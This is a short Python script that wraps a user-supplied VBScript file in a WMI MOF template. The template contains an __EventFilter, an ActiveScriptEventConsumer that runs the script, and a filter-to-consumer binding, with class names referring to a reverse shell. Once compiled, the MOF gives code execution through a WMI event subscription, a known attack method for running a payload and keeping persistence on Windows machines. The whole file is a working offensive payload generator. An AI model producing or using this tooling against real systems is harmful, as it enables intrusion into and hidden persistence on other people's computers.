import sys
import string
import random


def add_vbs_to_mof(vbs_code):
    random_class_name = ''.join([random.choice(string.ascii_letters + string.digits) for n in range(32)][:6]).title()
    mof_template = "#pragma namespace (\"\\\\\\\\.\\\\root\\\\subscription\")\n" \
                "\n" \
                "class MyReverseShellMofClass \n" \
                "{\n" \
                "  [key]\n" \
                "  string Name;\n" \
                "};\n" \
                "\n" \
                "instance of __EventFilter as $FILTER\n" \
                "{\n" \
                "  Name = \"XPLOIT_TEST_SYSTEM\";\n" \
                "  EventNamespace = \"root\\\\subscription\";\n" \
                "  Query = \"SELECT * FROM __InstanceCreationEvent \"\n" \
                "  \"WHERE TargetInstance.__class = \\\"MyReverseShellMofClass\\\"\";\n" \
                "  QueryLanguage = \"WQL\";\n" \
                "};\n" \
                "\n" \
                "instance of ActiveScriptEventConsumer as $CONSUMER\n" \
                "{\n" \
                "  Name = \"XPLOIT_TEST_SYSTEM\";\n" \
                "  ScriptingEngine = \"VBScript\";\n" \
                "  ScriptText = vbscode; \n" \
                "};\n" \
                "\n" \
                "instance of __FilterToConsumerBinding as $BIND\n" \
                "{\n" \
                "  Consumer = $CONSUMER ;\n" \
                "  Filter = $FILTER ;\n" \
                "};\n" \
                "\n" \
                "instance of MyReverseShellMofClass\n" \
                "{\n" \
                "  Name = \"ReverseShellMof\";\n" \
                "};";
    mof_template = mof_template.replace("MyReverseShellMofClass", random_class_name)
    mof = mof_template.replace("vbscode", vbs_code.rstrip())
    return mof


def main():
    vbs_code = ""

    with open(sys.argv[1], 'r') as f:
        for code in f:
            # Escape all quotation marks and backslashes
            code = code.replace("\\","\\\\")
            code = code.replace('"','\\"')
            new_code = '"' + code.rstrip() + r'\n"'
            vbs_code += new_code + '\n'
    # Insert escaped vbs code into mof code and print
    print(add_vbs_to_mof(vbs_code))


if __name__ == "__main__":
    main()